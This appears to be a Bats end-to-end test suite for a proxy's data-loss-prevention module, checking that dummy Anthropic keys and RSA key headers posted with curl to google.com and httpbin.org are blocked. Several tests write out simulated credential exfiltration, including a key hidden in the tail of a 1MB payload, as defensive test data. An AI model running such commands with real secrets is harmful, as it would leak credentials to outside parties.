#!/usr/bin/env bats
# bats file_tags=e2e,sentinel
# DLP Module E2E Tests
# Tests for credential detection and blocking via srv_polis_dlp
#
# NOTE: g3proxy uses HTTP/2 which causes curl exit code 92 (stream CANCEL)
# on many requests. Tests check output content, not exit codes.

setup_file() {
    load "../helpers/common.bash"
    relax_security_level
    wait_for_port "$ICAP_CONTAINER" 1344 || skip "ICAP port 1344 not ready"
}

teardown_file() {
    load "../helpers/common.bash"
    restore_security_level
}

setup() {
    load "../helpers/common.bash"
    require_container "$WORKSPACE_CONTAINER"

    # Example credentials — use short keys that won't trigger aws_secret false positive
    ANTHROPIC_KEY="sk-ant-api01-abcdefghij1234567890"
    RSA_PRIVATE_KEY="-----BEGIN RSA PRIVATE KEY-----"
}

teardown() {
    docker exec "${WORKSPACE_CONTAINER}" rm -f /tmp/large_payload 2>/dev/null || true
}

@test "e2e-dlp: Anthropic key to api.anthropic.com is ALLOWED" {
    # Credentials to allowed destination should pass through (not blocked by DLP)
    run_with_network_skip "anthropic.com" docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
        -X POST -d "key=${ANTHROPIC_KEY}" \
        --connect-timeout 15 https://api.anthropic.com/v1/messages
    # Must NOT contain polis block headers
    refute_output --partial "x-polis-block"
}

@test "e2e-dlp: Anthropic key to google.com is BLOCKED" {
    run_with_network_skip "google.com" docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
        -X POST -d "exfiltrating_key=${ANTHROPIC_KEY}" \
        --connect-timeout 15 https://www.google.com
    assert_output --partial "x-polis-block: true"
    # DLP module returns the pattern name as the reason
    assert_output --partial "x-polis-reason: anthropic"
    assert_output --partial "x-polis-pattern: anthropic"
}

@test "e2e-dlp: RSA private key to any destination is BLOCKED" {
    run_with_network_skip "httpbin.org" docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
        -X POST -d "data=${RSA_PRIVATE_KEY}" \
        --connect-timeout 15 https://httpbin.org/post
    assert_output --partial "x-polis-block: true"
    assert_output --partial "x-polis-pattern: rsa_key"
}

@test "e2e-dlp: plain traffic without credentials is ALLOWED" {
    run_with_network_skip "httpbin.org" docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
        -X POST -d "hello=world" \
        --connect-timeout 15 https://httpbin.org/post
    refute_output --partial "x-polis-block"
}

@test "e2e-dlp: credential in tail of large body (>1MB) is BLOCKED" {
    docker exec "${WORKSPACE_CONTAINER}" sh -c \
        "dd if=/dev/zero bs=1M count=1 2>/dev/null > /tmp/large_payload && echo '${ANTHROPIC_KEY}' >> /tmp/large_payload"

    run_with_network_skip "httpbin.org" docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
        -X POST --data-binary @/tmp/large_payload \
        --connect-timeout 15 https://httpbin.org/post

    assert_output --partial "x-polis-block: true"
}
